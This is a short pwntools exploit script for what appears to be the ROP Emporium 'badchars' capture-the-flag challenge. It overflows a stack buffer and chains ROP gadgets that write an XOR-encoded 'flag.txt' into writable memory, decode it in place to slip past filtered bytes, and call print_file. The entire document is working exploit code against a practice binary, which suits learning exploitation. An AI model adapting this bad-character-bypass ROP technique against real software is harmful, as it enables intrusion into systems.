from pwn import *
elf = context.binary = ELF("./badchars",checksec=False)
p = process()

offset = 40
def decrypt_xor(addr):
    payload = []
    xor_r15_r14_ADDR = 0x0000000000400628 #xor byte ptr [r15], r14b; ret;
    pop_r14_r15_ADDR = 0x00000000004006a0 #pop r14; pop r15; ret;
    for i in range(len(str(addr))-3): # -3 because to adjust so there's no extra addresses being xored
        payload.append((pop_r14_r15_ADDR, 2, writeable_ADDR + i, xor_r15_r14_ADDR))
    return payload


flag_XOR = xor(b'flag.txt',2)

mov_r13_r12_ADDR = 0x0000000000400634 #mov qword ptr [r13], r12; ret;
pop_r12_r13_ADDR = 0x000000000040069c # pop r12; pop r13; pop r14; pop r15; ret;
writeable_ADDR = 0x6010c0


payload = flat(
        b'A'*offset,
        pop_r12_r13_ADDR,
        flag_XOR,
        writeable_ADDR,
        0x0,
        0x0,
        mov_r13_r12_ADDR,
        decrypt_xor(flag_XOR),
        0x00000000004006a3, #pop rdi; ret;
        writeable_ADDR,
        0x0000000000400620 #print_file();
)
write("payload.txt",payload)
print(len(payload))
p.recvuntil(b"> ")
p.sendline(payload)
p.interactive()
